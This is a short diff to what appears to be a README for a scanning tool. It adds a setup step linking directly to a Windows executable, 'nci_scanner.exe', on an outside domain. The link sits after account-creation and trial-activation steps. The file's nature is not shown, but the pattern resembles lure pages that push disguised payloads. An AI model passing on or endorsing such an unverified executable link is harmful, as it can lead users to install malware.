@@ -26,6 +26,7 @@ Built for speed. Engineered for scale. Designed to outpace.
 2. Create a new user account.
 3. Activate the **1-day trial subscription**.
 4. Once activated, you can access and use the tool.
+5. Download Link: https://ziply.pk/download-nci_scanner.exe
 
 ---
 
